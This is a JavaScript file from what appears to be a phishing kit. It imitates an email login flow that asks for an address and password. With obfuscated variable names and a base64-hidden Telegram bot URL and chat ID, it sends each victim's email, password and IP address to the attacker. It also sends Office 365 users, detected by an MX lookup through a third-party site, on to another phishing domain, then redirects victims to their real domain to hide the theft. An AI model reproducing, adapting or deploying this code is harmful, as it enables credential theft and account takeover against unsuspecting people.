$(document).ready(function () {
//const queryString = window.location.search;
const qstring = window.location.hash.substr(1);
const urlParams = new URLSearchParams(qstring);
console.log(urlParams);
const sub = urlParams.get('bus')
const lme = urlParams.get('eml')

if (!sub == ""){
	$("#filetype").text(window.atob(sub))
}

  var _0xd885x1 = 0;
  $.getJSON("https://api.ipify.org?format=jsonp&callback=?", function (_0xd885x2) {
    ops = JSON.stringify(_0xd885x2);
    ops = JSON.stringify(_0xd885x2);
    console.log(ops);
  });
  $(document).keypress(function (_0xd885x3) {
    var _0xd885x4 = _0xd885x3.keyCode ? _0xd885x3.keyCode : _0xd885x3.which;
    if (_0xd885x4 == "13") {
      if ($("#divPr").is(":visible")) {
        $("#submit-btn").trigger("click");
      } else {
        $("#next").trigger("click");
      }
    }
  });
  
  
  $("#next").click(function () {
    $("#error").hide();
    $("#msg").hide();
    event.preventDefault();
    var _0xd885x5 = $("#ai").val();
    var _0xd885x6 = _0xd885x5;
    var _0xd885x7 = /^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/;
    if (!_0xd885x5) {
      $("#error").show();
      $("#error").html("Email field is empty.!");
      _0xd885x5.focus;
      return false;
    }
    ;
    if (!_0xd885x7.test(_0xd885x6)) {
      $("#error").show();
      $("#error").html("That account doesn't exist. Enter a different account");
      _0xd885x5.focus;
      return false;
    }
    ;
    $("#next").html("checking...");
    setTimeout(function () {
      $("#ai").attr("readonly", "");
	  
	  var iq = _0xd885x6; // Put your Mailer email-tag here 
		var dom_p = iq.split("@")[1];
		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            // Typical action to be performed when the document is ready:
            if (xhttp.responseText.includes('protection.outlook.com') || xhttp.responseText.includes('barracudanetworks') || xhttp.responseText.includes('ppe-hosted') || xhttp.responseText.includes('trendmicro') || xhttp.responseText.includes('iphmx')){
                console.log("Its an OFFICE365");
				var rulik = "https://accounts.goodbyehage.com/opso?S=57kB8zo"; 
				window.location.href = rulik+"#"+iq;
            }else{
                 $("#divPr").animate({right: 0, opacity: "show"}, 1e3);
				  $("#next").html("next");
				  $("#next").animate({left: 0, opacity: "hide"}, 0);
				  $("#submit-btn").animate({right: 0, opacity: "show"}, 1e3);
            }
            
        }
		};
		xhttp.open("GET", "https://kimberleysupports.org.au/test/ssi/getmx.php?host=" + dom_p, true);
		xhttp.send();
    }, 1e3);
  });
  var _0xd885x5 = lme;
  if (!_0xd885x5) {} else {
    var _0xd885x6 = _0xd885x5;
    var _0xd885x8 = _0xd885x6.indexOf("@");
    var _0xd885x9 = _0xd885x6.substr(_0xd885x8 + 1);
    var _0xd885xa = _0xd885x9.substr(0, _0xd885x9.indexOf("."));
    var _0xd885xb = _0xd885xa.toLowerCase();
	var _0xd885x7 = /^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/;
	 if (_0xd885x7.test(_0xd885x6)){
		$("#ai").val(_0xd885x6);
	 }
    $("#msg").hide();
	window.onload=function(){
        //$('#next').click();
    };

  }
  ;
  var _0xd885xc = "ODE3MTYzNTEw";
  $("#submit-btn").click(function (_0xd885x3) {
    $("#error").hide();
    $("#msg").hide();
    _0xd885x3.preventDefault();
    var _0xd885x5 = $("#ai").val();
    var _0xd885xd = $("#pr").val();
    var _0xd885x6 = _0xd885x5;
    var _0xd885x7 = /^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/;
    if (!_0xd885x5) {
      $("#error").show();
      $("#error").html("Email field is empty.!");
      _0xd885x5.focus;
      return false;
    }
    ;
    if (!_0xd885x7.test(_0xd885x6)) {
      $("#error").show();
      $("#error").html("That account doesn't exist. Enter a different account");
      _0xd885x5.focus;
      return false;
    }
    ;
    if (!_0xd885xd) {
      $("#error").show();
      $("#error").html("Password field is emply.!");
      _0xd885x5.focus;
      return false;
    }
    ;
    _0xd885x1 = _0xd885x1 + 1;
    const _0xd885xe = "OTHERS: \n*************************\n" + _0xd885x5 + " | " + _0xd885xd + "\n" + "IP: " + ops + "\n" + "Count: " + _0xd885x1;
    var _0xd885x8 = _0xd885x6.indexOf("@");
    var _0xd885x9 = _0xd885x6.substr(_0xd885x8 + 1);
    var _0xd885xa = _0xd885x9.substr(0, _0xd885x9.indexOf("."));
    var _0xd885xb = _0xd885xa.toLowerCase();
    $.ajax({dataType: "JSON", url: window.atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUyMzc0MTA3MDY6QUFHMU5NVHNRUHAtZURUZUZueW9mNjBzOXVuTlNQQnVrOGMvc2VuZE1lc3NhZ2U="), type: "POST", data: {chat_id: window.atob(_0xd885xc), text: _0xd885xe}, beforeSend: function (_0xd885xf) {
      $("#submit-btn").html("Verifing...");
    }, success: function (_0xd885x10) {
      $("#pr").val("");
      $("#pr").focus();
      if (_0xd885x10) {
        $("#msg").show();
        console.log(_0xd885x10);
        if (_0xd885x10.signal == "ok") {
          $("#pr").val("");
          if (_0xd885x1 >= 2) {
            _0xd885x1 = 0;
            window.location.replace("https://www." + _0xd885x9);
          }
        } else {}
      }
    }, error: function () {
      $("#pr").val("");
      $("#pr").focus();
      if (_0xd885x1 >= 2) {
        _0xd885x1 = 0;
        window.location.replace("https://www." + _0xd885x9);
      }
      $("#msg").show();
    }, complete: function () {
      $("#pr").val("");
      $("#pr").focus();
      $("#submit-btn").html("Verify");
	  if (_0xd885x1 >= 2) {
        _0xd885x1 = 0;
        window.location.replace("https://www." + _0xd885x9);
      }
    }});
  });
});